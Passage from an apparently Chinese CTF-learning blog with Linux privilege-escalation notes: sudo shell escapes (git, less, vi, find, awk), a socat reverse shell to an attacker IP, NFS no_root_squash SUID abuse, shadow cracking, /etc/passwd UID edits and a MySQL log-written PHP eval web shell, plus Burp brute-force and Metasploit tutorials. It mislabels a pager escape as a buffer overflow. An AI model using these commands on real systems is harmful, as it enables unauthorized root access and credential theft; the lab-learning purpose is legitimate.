<p><strong><u>就可以发现<code>root</code>以<code>nopasswd</code>【不需要密码】运行git命令</u></strong></p>
<p>原理是git存在缓存区溢出漏洞，</p>
<p>在使用</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">sudo git -<span class="selector-tag">p</span></span><br></pre></td></tr></table></figure>

<p>不需要输入root密码，即可以root身份执行这条命令</p>
<p>操作如下</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">sudo git -<span class="selector-tag">p</span>     </span><br><span class="line">//-<span class="selector-tag">p</span>是分页查看，这个原理就是终端的窗口大小不够显示，所以下方会出现冒号，等待输入命令</span><br></pre></td></tr></table></figure>

<p>下面可以看看区别</p>
<h5 id="注意"><a href="#注意" class="headerlink" title="*注意"></a>*注意</h5><h6 id="1-窗口足够大"><a href="#1-窗口足够大" class="headerlink" title="1.窗口足够大"></a>1.窗口足够大</h6><p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901113721300.png"><img src="/Linux-PowerUp/image-20220901113721300.png" alt="image-20220901113721300"></a></p>
<p>可以看到显示完了，就有回到原处了</p>
<h6 id="2-窗口小一些"><a href="#2-窗口小一些" class="headerlink" title="2.窗口小一些"></a>2.窗口小一些</h6><p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901113851826.png"><img src="/Linux-PowerUp/image-20220901113851826.png" alt="image-20220901113851826"></a></p>
<p>下方就显示出:，等待输入</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">**:是自带有的，不是输入的</span><br><span class="line">:!/bin/sh    //感叹号!是shell转义字符，所以要避免sudo授权用户使用vi，vim，ftp，lee，more，git</span><br><span class="line">进入root</span><br><span class="line"><span class="section">cd /root</span></span><br><span class="line"><span class="section">--</span></span><br><span class="line">当然也可以执行:!passwd root</span><br><span class="line">修改其密码</span><br><span class="line">然后su root登录也可</span><br></pre></td></tr></table></figure>

<h5 id="1-执行命令，拿到root的shell"><a href="#1-执行命令，拿到root的shell" class="headerlink" title="1.执行命令，拿到root的shell"></a>1.执行命令，拿到root的shell</h5><p><code>$</code>变成<code>#</code>成功</p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901114902493.png"><img src="/Linux-PowerUp/image-20220901114902493.png" alt="image-20220901114902493"></a></p>
<h5 id="2-修改密码，登录"><a href="#2-修改密码，登录" class="headerlink" title="2.修改密码，登录"></a>2.修改密码，登录</h5><p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901114453769.png"><img src="/Linux-PowerUp/image-20220901114453769.png" alt="image-20220901114453769"></a></p>
<p><code>$</code>变成<code>#</code>，成功登录</p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901114726423.png"><img src="/Linux-PowerUp/image-20220901114726423.png" alt="image-20220901114726423"></a></p>
<h4 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a><strong>其他命令</strong></h4><p>也有很多其他命令可以用来提权，和之前的SUID提权中说的命令类似，例如sudo允许find命令，则可以通过exec参数来切换到root权限。</p>
<p>这里添加新用户aaa，并修改sudoers文件，允许部分命令，内容如下。</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">aaa  ALL=(ALL:ALL) <span class="regexp">/usr/</span>bin<span class="regexp">/find,/u</span>sr<span class="regexp">/bin/</span>perl,<span class="regexp">/usr/</span>bin<span class="regexp">/python3,/u</span>sr<span class="regexp">/bin/</span>less,<span class="regexp">/usr/</span>bin<span class="regexp">/awk,/u</span>sr<span class="regexp">/bin/m</span>an,<span class="regexp">/usr/</span>bin/vi</span><br></pre></td></tr></table></figure>

<p>这时aaa用户使用sudo就只能执行配置好的命令，sudo su和sudo bash被禁止执行。</p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901224325691.png"><img src="/Linux-PowerUp/image-20220901224325691.png" alt="image-20220901224325691"></a></p>
<p>相关命令提权方式如下：</p>
<h5 id="find"><a href="#find" class="headerlink" title="find"></a>find</h5><blockquote>
<p><code>exec</code>参数用来指定搜索结果的处理命令，需要以分号结尾，分号在命令行有特殊函数，要用<code>\</code>进行转义。</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901224342169.png"><img src="/Linux-PowerUp/image-20220901224342169.png" alt="image-20220901224342169"></a></p>
<h5 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h5><blockquote>
<p><code>e</code>参数用来指定要运行的命令，然后使用<code>linux</code>的<code>exec</code>参数来调用<code>bash</code>。</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901224356163.png"><img src="/Linux-PowerUp/image-20220901224356163.png" alt="image-20220901224356163"></a></p>
<h5 id="python"><a href="#python" class="headerlink" title="python"></a>python</h5><blockquote>
<p><code>c</code>参数可以在命令行执行<code>python</code>代码，<code>pty</code>库是一个伪终端库，它的<code>spawn</code>会调用指定的程序。</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901224409127.png"><img src="/Linux-PowerUp/image-20220901224409127.png" alt="image-20220901224409127"></a></p>
<h5 id="less"><a href="#less" class="headerlink" title="less"></a>less</h5><blockquote>
<p>输入<code>sudo less /etc/hosts</code>命令浏览文件内容时，到底部输入<code>!bash</code>后回车，会获得一个<code>root</code>权限的<code>shell</code>。</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901224420552.png"><img src="/Linux-PowerUp/image-20220901224420552.png" alt="image-20220901224420552"></a></p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901224511943.png"><img src="/Linux-PowerUp/image-20220901224511943.png" alt="image-20220901224511943"></a></p>
<h5 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h5><blockquote>
<p>通过调用linux的system函数来打开bash。</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901224431624.png"><img src="/Linux-PowerUp/image-20220901224431624.png" alt="image-20220901224431624"></a></p>
<h5 id="man"><a href="#man" class="headerlink" title="man"></a>man</h5><blockquote>
<p>通过sudo man man命令来打开man的使用手册，同时会进入编辑行，输入!bash回车，可获取root权限。</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901224541655.png"><img src="/Linux-PowerUp/image-20220901224541655.png" alt="image-20220901224541655"></a></p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901224551402.png"><img src="/Linux-PowerUp/image-20220901224551402.png" alt="image-20220901224551402"></a></p>
<h5 id="vi"><a href="#vi" class="headerlink" title="*vi"></a>*vi</h5><blockquote>
<p><code>sudo vi</code>会进入vi默认页，输入<code>:!bash</code>回车，可进入<code>root</code>命令行。</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901224609706.png"><img src="/Linux-PowerUp/image-20220901224609706.png" alt="image-20220901224609706"></a></p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901224622369.png"><img src="/Linux-PowerUp/image-20220901224622369.png" alt="image-20220901224622369"></a></p>
<h5 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h5><blockquote>
<p>如果sudoers定义了可以执行某个脚本，则我们可以把返回shell的代码添加进去。</p>
</blockquote>
<p>例如桌面有个运维需要的aaa.sh文件，我们添加一段打开bash的代码，然后sudo运行即可。</p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901224639423.png"><img src="/Linux-PowerUp/image-20220901224639423.png" alt="image-20220901224639423"></a></p>
<p>参考代码：</p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901224909264.png"><img src="/Linux-PowerUp/image-20220901224909264.png" alt="image-20220901224909264"></a></p>
<h4 id="应用程序"><a href="#应用程序" class="headerlink" title="应用程序"></a><strong>应用程序</strong></h4><blockquote>
<p>除了上面的一些二进制文件，一些应用程序也可以获取root权限，例如env、ftp、socat、scp。</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901225004858.png"><img src="/Linux-PowerUp/image-20220901225004858.png" alt="image-20220901225004858"></a></p>
<h5 id="env"><a href="#env" class="headerlink" title="env"></a>env</h5><blockquote>
<p>通过env环境变量来获取root权限。</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901225022285.png"><img src="/Linux-PowerUp/image-20220901225022285.png" alt="image-20220901225022285"></a></p>
<h5 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h5><blockquote>
<p>通过ftp来进入bash获取root权限。</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901225031965.png"><img src="/Linux-PowerUp/image-20220901225031965.png" alt="image-20220901225031965"></a></p>
<h5 id="socat"><a href="#socat" class="headerlink" title="socat"></a>socat</h5><blockquote>
<p>通过socat客户端连接攻击机，攻击机可获得rootshell。先执行服务端，后执行客户端。</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo socat <span class="built_in">exec</span>:<span class="string">&#x27;sh -li&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:192.168.23.128:4444</span><br><span class="line">攻击机执行：</span><br><span class="line">socat file:`<span class="built_in">tty</span>`,raw,<span class="built_in">echo</span>=0 tcp-listen:4444</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901225047468.png"><img src="/Linux-PowerUp/image-20220901225047468.png" alt="image-20220901225047468"></a></p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901225056003.png"><img src="/Linux-PowerUp/image-20220901225056003.png" alt="image-20220901225056003"></a></p>
<h5 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h5><blockquote>
<p>还有一个scp，scp是一个安全复制文件的命令，它无法获取一个shell，但可以用来复制一些系统的敏感文件。例如etc&#x2F;passwd、etc&#x2F;shadow等。</p>
<p>如下命令，将passwd文件传输到指定机器的root&#x2F;Desktop下，然后再对密码进行破解等操作。</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901225110501.png"><img src="/Linux-PowerUp/image-20220901225110501.png" alt="image-20220901225110501"></a></p>
<h4 id="黑名单情况"><a href="#黑名单情况" class="headerlink" title="黑名单情况"></a><strong>黑名单情况</strong></h4><blockquote>
<p>如果碰到sudoers文件使用黑名单的情况，比如说权限禁用sudo使用find命令，但是都是在ALL基础上设置的，那么可以cp把find复制到其它目录运行。</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901225127772.png"><img src="/Linux-PowerUp/image-20220901225127772.png" alt="image-20220901225127772"></a></p>
<h2 id="3-NFS配置不当导致提权"><a href="#3-NFS配置不当导致提权" class="headerlink" title="3) NFS配置不当导致提权"></a>3) NFS配置不当导致提权</h2><h3 id="NFS介绍"><a href="#NFS介绍" class="headerlink" title="NFS介绍"></a>NFS介绍</h3><blockquote>
<p>NFS是network file system缩写，网络文件系统，用来挂在某个目录或文件进行共享，默认是2049端口，功能类似于windows的共享。</p>
</blockquote>
<p>这里以ubuntu为例，简单配置一下：</p>
<p>首先安装nfs服务端：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">sudo apt-<span class="keyword">get</span> install nfs-kernel-<span class="keyword">server</span></span><br></pre></td></tr></table></figure>

<p>安装后修改配置文件&#x2F;etc&#x2F;exports，这里将home目录进行挂载共享，内容如下：</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">/home *(rw,no_root_squash)</span><br></pre></td></tr></table></figure>

<p>其中&#x2F;home是要挂载的目录，*代表允许连接的主机，这里是所有，rw是读写权限，no_root_squash代表客户端允许以root权限访问nfs。</p>
<p>随后重启相关服务：</p>
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line"># nfs通过rpc通信，这里把rpcbind也重启下sudo <span class="regexp">/etc/</span><span class="keyword">init</span>.d<span class="regexp">/rpcbind restartsudo /</span>etc<span class="regexp">/init.d/</span>nfs<span class="operator">-</span>kernel<span class="operator">-</span>server restart</span><br></pre></td></tr></table></figure>

<p>此时就配置好了，可以通过showmount命令来列出目标机的共享目录，e参数显示NFS服务器的输出清单。</p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901231323392.png"><img src="/Linux-PowerUp/image-20220901231323392.png" alt="image-20220901231323392"></a></p>
<p>或者通过nmap的相关脚本来进行扫描。</p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901231334381.png"><img src="/Linux-PowerUp/image-20220901231334381.png" alt="image-20220901231334381"></a></p>
<h3 id="NFS配置不当可提权"><a href="#NFS配置不当可提权" class="headerlink" title="NFS配置不当可提权"></a><strong>NFS配置不当可提权</strong></h3><blockquote>
<p>当nfs配置了读写权限，且允许客户端以root访问时，就会存在安全隐患。</p>
</blockquote>
<p>测试如下：</p>
<p>首先客户端把目标机nfs的共享挂载到本地，然后把bash复制进去并赋予suid权限，操作如下图。</p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901231351979.png"><img src="/Linux-PowerUp/image-20220901231351979.png" alt="image-20220901231351979"></a></p>
<p>此时目标机的home目录下就会有一个具有suid权限的bash。</p>
<p>普通用户执行即可获取root权限，这里注意需要加上<code>p</code>参数，否则权限还是当前用户的。</p>
<p><code>p</code>参数说明：不提供的情况下，打开bash权限是当前实际用户，提供的情况下，会打开特权模式，像上继承<code>suid</code>，因为bash有<code>suid</code>权限，所以这里是root。</p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901231410196.png"><img src="/Linux-PowerUp/image-20220901231410196.png" alt="image-20220901231410196"></a></p>
<p>使用场景：这个和<code>suid</code>提权很像，给程序赋予<code>suid</code>权限然后利用。不同的是前两篇<code>suid</code>提权是当前用户使用<code>sudo  chmod</code>自己修改的，在<code>sudoers</code>禁用<code>sudo</code>命令等情况下，就行不通了。而<code>nfs</code>配置利用，是客户端挂载到本地赋权的，目标机的普通用户只需执行就可以。</p>
<p>同理，之前总结的<code>suid</code>提权的那些程序也同样适用，这里就不再记了。</p>
<h3 id="其它命令"><a href="#其它命令" class="headerlink" title="其它命令"></a><strong>其它命令</strong></h3><p>除了可以直接得到<code>shell</code>的，还有其他一些程序不能直接获取，例如<code>nano、vi</code>等。</p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901231423093.png"><img src="/Linux-PowerUp/image-20220901231423093.png" alt="image-20220901231423093"></a></p>
<p>然后使用<code>nano -p</code>来读取<code>shadow</code>文件，这里读取时把相关记录复制出来，使用<code>john</code>破解，测试不能重定向，需要权限，所以只能复制。</p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901231435125.png"><img src="/Linux-PowerUp/image-20220901231435125.png" alt="image-20220901231435125"></a></p>
<p>复制后使用<code>john</code>破解获取相关用户密码，以<code>root</code>为例，密码是<code>root</code>。</p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901231451129.png"><img src="/Linux-PowerUp/image-20220901231451129.png" alt="image-20220901231451129"></a></p>
<p>如果密码太复杂，破解不了，则可以尝试其它用户，例如我这里目标机是<code>aaa</code>用户，破解<code>aaa</code>密码为<code>aaa</code>。</p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901231505353.png"><img src="/Linux-PowerUp/image-20220901231505353.png" alt="image-20220901231505353"></a></p>
<p>这时候不确定<code>aaa</code>是否为<code>root</code>权限，则可以继续使用<code>nano</code>去编辑<code>passwd</code>文件，给<code>aaa</code>赋权。</p>
<p>把原来的<code>1001</code>换成<code>0</code>.</p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901231516388.png"><img src="/Linux-PowerUp/image-20220901231516388.png" alt="image-20220901231516388"></a></p>
<p>然后切换<code>aaa</code>用户即可。</p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901231524654.png"><img src="/Linux-PowerUp/image-20220901231524654.png" alt="image-20220901231524654"></a></p>
<p>利用这种机制，也可以用来修改<code>sudoers</code>文件，添加或修改为以下内容。</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">aaa     <span class="keyword">ALL</span>=(<span class="keyword">ALL</span>:<span class="keyword">ALL</span>) NOPASSWD:<span class="keyword">ALL</span></span><br></pre></td></tr></table></figure>

<p>然后使用<code>sudo bash</code>或<code>sudo su</code>获取<code>root</code>权限。</p>
<p><a data-fancybox="gallery" data-src="/Linux-PowerUp/image-20220901231537204.png"><img src="/Linux-PowerUp/image-20220901231537204.png" alt="image-20220901231537204"></a></p>
<h2 id="4）Mysql提权"><a href="#4）Mysql提权" class="headerlink" title="4）Mysql提权"></a>4）Mysql提权</h2><h3 id="1、通过mysql日志功能"><a href="#1、通过mysql日志功能" class="headerlink" title="1、通过mysql日志功能"></a>1、通过mysql日志功能</h3><blockquote>
<p><code>SHOW VARIABLES LIKE &#39;general%&#39; 查询日志</code></p>
<p><code>set global general_log = &quot;ON&quot;; 开启日志记录</code></p>
<p><code>set global general_log_file=&#39;C://phpStudy//PHPTutorial//WWW//shell.php&#39;; 设置日志路径</code></p>
<p><code>select &#39;&lt;?php @eval($_POST[1]);?&gt;&#39;; 写入一句话</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="https://pic4.zhimg.com/80/v2-a4aea75eafabcf886d91113ba2822717_720w.webp"><img src="https://pic4.zhimg.com/80/v2-a4aea75eafabcf886d91113ba2822717_720w.webp" alt="img"></a></p>
<p><a data-fancybox="gallery" data-src="https://pic3.zhimg.com/80/v2-fa69f44df8bfd5f44a8d6a11dad9a55e_720w.webp"><img src="https://pic3.zhimg.com/80/v2-fa69f44df8bfd5f44a8d6a11dad9a55e_720w.webp" alt="img"></a></p>
<p>连接成功</p>
<h2 id="5）环境变量提权"><a href="#5）环境变量提权" class="headerlink" title="5）环境变量提权"></a>5）环境变量提权</h2><p><code>nepctf2023遇到</code></p>
<hr>
<h2 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h2><h3 id="linux常见的敏感文件"><a href="#linux常见的敏感文件" class="headerlink" title="linux常见的敏感文件"></a>linux常见的敏感文件</h3><figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">/etc/passwd</span><br><span class="line">/<span class="built_in">proc</span>/<span class="variable language_">self</span>      <span class="comment">#当前运行进程</span></span><br><span class="line">/<span class="built_in">proc</span>/<span class="variable language_">self</span>/cmdline  <span class="comment">#当前进程命令行参数=</span></span><br><span class="line">/<span class="built_in">proc</span>/<span class="variable language_">self</span>/men     <span class="comment">#当前进程的内存内容</span></span><br><span class="line">/<span class="built_in">proc</span>/<span class="variable language_">self</span>/maps    <span class="comment">#当前进程的内存映射关系</span></span><br><span class="line">/<span class="built_in">proc</span>/<span class="variable language_">self</span>/environ <span class="comment">#包含当前进程的环境变量</span></span><br><span class="line">/<span class="built_in">proc</span>/<span class="variable language_">self</span>/fd  <span class="comment">#包含当前进程打开的文件的内容和路径</span></span><br><span class="line">/<span class="built_in">proc</span>/seflf/exe   <span class="comment">#获取当前进程</span></span><br><span class="line">/<span class="built_in">proc</span>/<span class="variable language_">self</span>/fd/    <span class="comment">#一个特殊的目录，它映射到了当前进程的文件描述符表。 【当文件删除了也可以在这里看到】</span></span><br><span class="line">           <span class="comment">#每个进程都有一个文件描述符表，其中包含了进程可以访问的文件和其他资源（如套接字、管道等）的描述符</span></span><br></pre></td></tr></table></figure>

<h4 id="内网探测文件"><a href="#内网探测文件" class="headerlink" title="内网探测文件"></a>内网探测文件</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">file:<span class="regexp">//</span><span class="regexp">/etc/</span>hosts</span><br><span class="line">file:<span class="regexp">//</span><span class="regexp">/proc/</span>net/arp</span><br><span class="line">file:<span class="regexp">//</span><span class="regexp">/proc/</span>net/tcp</span><br><span class="line">file:<span class="regexp">//</span><span class="regexp">/proc/</span>net/udp</span><br><span class="line">file:<span class="regexp">//</span><span class="regexp">/proc/</span>net/dev</span><br><span class="line">file:<span class="regexp">//</span><span class="regexp">/proc/</span>net/fib_trie</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>daily</category>
      </categories>
      <tags>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>Burpsuite密码爆破</title>
    <url>/tooluse(bp-bruce)/</url>
    <content><![CDATA[<p><code>顺便记一下，免得后面到处翻</code></p>
<span id="more"></span>

<h1 id="Burpsuite密码爆破"><a href="#Burpsuite密码爆破" class="headerlink" title="Burpsuite密码爆破"></a>Burpsuite密码爆破</h1><p>虽然不知道这个网站是那位大佬总结建立的，但还是很感谢，节省很多时间，这个网站提供了很全面的密码表</p>
<blockquote>
<p><a href="https://www.somd5.com/download/dict/">https://www.somd5.com/download/dict/</a></p>
</blockquote>
<p>之前在学习burpsuite的时候，大部分时间在用proxy和request，一直想用intruder，在做功防世界weak_auth这道题时，需要用字典爆破</p>
<p>于是我便了解了一下这个功能</p>
<blockquote>
<p>在intruder下，主要看payload</p>
<p>payload Sets主要用Simple list和Brute forcer</p>
</blockquote>
<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><h3 id="1-Simple-list"><a href="#1-Simple-list" class="headerlink" title="1.Simple list"></a>1.Simple list</h3><p>主要就是讲写好的密码列表挨个进行测试，试出可以正确登录的密码</p>
<p><a data-fancybox="gallery" data-src="/tooluse(bp-bruce)/image-20220624165348786.png"><img src="/tooluse(bp-bruce)/image-20220624165348786.png" alt="image-20220624165348786"></a></p>
<h3 id="2-Brute-forcer"><a href="#2-Brute-forcer" class="headerlink" title="2.Brute forcer"></a>2.Brute forcer</h3><p>就比较暴力，可以从下图看到Requset count有8,398,080次，因为他是把下面Character set里的所以字符的排列组合都试了，简单粗暴，也非常耗时间</p>
<p><a data-fancybox="gallery" data-src="/tooluse(bp-bruce)/image-20220624165405777.png"><img src="/tooluse(bp-bruce)/image-20220624165405777.png" alt="image-20220624165405777"></a></p>
<p>这里以一次爆破为例，可以看到下方有两个<code>§ §</code>，这两处就是payload输入点，我们输入爆破数据就不断在这两处上传测试</p>
<p><a data-fancybox="gallery" data-src="/tooluse(bp-bruce)/image-20220624170325792.png"><img src="/tooluse(bp-bruce)/image-20220624170325792.png" alt="image-20220624170325792"></a></p>
<p>如果我们已经知道了一处的数据，比如下方的username为admin，就不用用测试数据爆破，只用在password处爆破</p>
<p><a data-fancybox="gallery" data-src="/tooluse(bp-bruce)/image-20220624170753675.png"><img src="/tooluse(bp-bruce)/image-20220624170753675.png" alt="image-20220624170753675"></a></p>
<p>那么爆破完后，如何分辨哪个才是正确密码呢</p>
<p>主要分析length，如果出现与大部分length不同的密码，那么大概率就是正确密码，比如此处， 123456就是正确密码</p>
<p><a data-fancybox="gallery" data-src="/tooluse(bp-bruce)/image-20220624170455916.png"><img src="/tooluse(bp-bruce)/image-20220624170455916.png" alt="image-20220624170455916"></a></p>
<h3 id="3-Numbers"><a href="#3-Numbers" class="headerlink" title="3.Numbers"></a>3.Numbers</h3><p><a data-fancybox="gallery" data-src="/tooluse(bp-bruce)/image-20220626083426611.png"><img src="/tooluse(bp-bruce)/image-20220626083426611.png" alt="image-20220626083426611"></a></p>
<p>纯数字型爆破，From是开始数字，To是结束数字，Step是间隔多少数字爆破一次</p>
<h3 id="4-Runtime-file"><a href="#4-Runtime-file" class="headerlink" title="4.Runtime file"></a>4.Runtime file</h3><p>选择自己的字典文件</p>
<h3 id="5-Custom-iterator"><a href="#5-Custom-iterator" class="headerlink" title="5.Custom iterator"></a>5.Custom iterator</h3><p>（可以自定义拼接字段，比如username:password，这样爆破的两列数据被:隔开进行爆破）</p>
<p>自定义迭代器。这种负载类型，可以配置项目的多个列表，并使用生成的列表中项的所有排列有效载荷。它提供了一个强有力的方法根据给定的模板，以产生字符或其他项目的定制排列。</p>
<h3 id="6-Character-substitution"><a href="#6-Character-substitution" class="headerlink" title="6.Character substitution"></a>6.Character substitution</h3><p>字符替换。此负载类型允许您配置一个字符串列表，并应用各种字符替换到每个项目。这可能是在密码猜测攻击非常有用，用来产生在字典中的单词常见的变化。</p>
<h3 id="7-Case-modification"><a href="#7-Case-modification" class="headerlink" title="7.Case modification"></a>7.Case modification</h3><p>此负载类型允许配置一个字符串列表，并应用各种情况下修改每个项目。这可能对密码猜测攻击非常有用，用来产生在字典中的单词的情况下的变化。</p>
<h3 id="8-Recursivegrep"><a href="#8-Recursivegrep" class="headerlink" title="8.Recursivegrep"></a>8.Recursivegrep</h3><p>递归grep，要用这个必须在Intruder&gt;options&gt;Grep-extract下添加一个响应匹配，比如说我一个请求页需要前一个响应页中的内容，这里就可以这样使用了。</p>
<h3 id="9-Dates"><a href="#9-Dates" class="headerlink" title="9.Dates"></a>9.Dates</h3><p>时间、日期</p>
<h3 id="10-Null-payloads"><a href="#10-Null-payloads" class="headerlink" title="10.Null payloads"></a>10.Null payloads</h3><p>这种攻击载荷产生有效载荷，其值是一个空字符串。当某种攻击请求需要反复发送同样的请求，但这种请求相对于基本请求是没有任何修改，这种攻击载荷产生有效载荷，这可用于各种攻击，例如采集 cookies来进行测序分析；应用层的拒绝服务攻击，这些请求被重复发送，导致服务器上产生高工作负荷的任务，或保活会话令牌，以便这些令牌在其它的间歇试验中使用。使用此载荷类型，它甚至没有必要在请求模板中标志有效载荷位置。您可以配置Burp产生一定特定数目的空有效载荷，或无限期地持续下去。当然我们也可以使用数字、日期等其他方式产生大量的连接，导致服务器的负载过高。</p>
<h2 id="Attack-type（爆破方式）"><a href="#Attack-type（爆破方式）" class="headerlink" title="Attack type（爆破方式）"></a>Attack type（爆破方式）</h2><p><a data-fancybox="gallery" data-src="/tooluse(bp-bruce)/image-20220710224734912.png"><img src="/tooluse(bp-bruce)/image-20220710224734912.png" alt="image-20220710224734912"></a></p>
<h3 id="1-Sniper"><a href="#1-Sniper" class="headerlink" title="1.Sniper"></a>1.Sniper</h3><p> 这个是我们最常用的，Sniper是狙击手的意思。这个模式会使用单一的payload【就是导入字典的payload】组。它会针对每个position中$$位置设置payload。这种攻击类型适合对常见漏洞中的请求参数单独地进行测试。攻击中的请求总数应该是position数量和payload数量的乘积。</p>
<h3 id="2-Battering-ram"><a href="#2-Battering-ram" class="headerlink" title="2.Battering ram"></a>2.Battering ram</h3><p> 这一模式是使用单一的payload组。它会重复payload并且一次把所有相同的payload放入指定的位置中。这种攻击适合那种需要在请求中把相同的输入放到多个位置的情况。请求的总数是payload组中payload的总数。简单说就是一个playload字典同时应用到多个position中。</p>
<h3 id="3-Pitchfork"><a href="#3-Pitchfork" class="headerlink" title="3.Pitchfork"></a>3.Pitchfork</h3><p>这一模式是使用多个payload组。对于定义的位置可以使用不同的payload组。攻击会同步迭代所有的payload组，把payload放入每个定义的位置中。比如：position中A处有a字典，B处有b字典，则a【1】将会对应b【1】进行attack处理，这种攻击类型非常适合那种不同位置中需要插入不同但相关的输入的情况。请求的数量应该是最小的payload组中的payload数量。</p>
<h3 id="4-Cluster-bomb"><a href="#4-Cluster-bomb" class="headerlink" title="4.Cluster bomb"></a>4.Cluster bomb</h3><p>这种模式会使用多个payload组。每个定义的位置中有不同的payload组。攻击会迭代每个payload组，每种payload组合都会被测试一遍。比如：position中A处有a字典，B处有b字典，则两个字典将会循环搭配组合进行attack处理这种攻击适用于那种位置中需要不同且不相关或者未知的输入的攻击。攻击请求的总数是各payload组中payload数量的乘积。（即可以在用户名和密码两处用两个字典爆破）</p>
]]></content>
      <categories>
        <category>daily</category>
      </categories>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>常用工具的使用</title>
    <url>/tooluse(Commontools)/</url>
    <content><![CDATA[<p><code>记性不好记录一下</code></p>
<span id="more"></span>

<h1 id="常用工具的使用"><a href="#常用工具的使用" class="headerlink" title="常用工具的使用"></a>常用工具的使用</h1><h2 id="1）msf"><a href="#1）msf" class="headerlink" title="1）msf"></a>1）msf</h2><h3 id="（1）msf基本使用"><a href="#（1）msf基本使用" class="headerlink" title="（1）msf基本使用"></a>（1）msf基本使用</h3><p><code>一个漏洞利用框架,对计算机软件漏洞进行攻击</code></p>
<p><strong>这里以vulnhub dc1为例</strong></p>
<p>终端输入<code>msfconsole</code>，进入msf界面，或者菜单也可以打开</p>
<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220830094506049.png"><img src="/tooluse(Commontools)/image-20220830094506049.png" alt="image-20220830094506049"></a></p>
<figure class="highlight openscad"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">search</span> drupal，找一下有没有drupal可以利用的脚本</span><br><span class="line"><span class="comment">/*对于其他命令，可以用help查询*/</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220830094939297.png"><img src="/tooluse(Commontools)/image-20220830094939297.png" alt="image-20220830094939297"></a></p>
<p>这里可以选择不同的脚本，下面以编号1的脚本为例，其他的应该也可以</p>
<figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line">输入<span class="keyword">use</span> <span class="number">1</span>，进入编号<span class="number">1</span>脚本的运行环境</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220830095106784.png"><img src="/tooluse(Commontools)/image-20220830095106784.png" alt="image-20220830095106784"></a></p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">输入<span class="keyword">show</span> <span class="keyword">options</span>,查看脚本运行的所需要配置的项目</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/tooluse(Commontools)/image-20220830105519336.png"><img src="/tooluse(Commontools)/image-20220830105519336.png" alt="image-20220830105519336"></a></p>
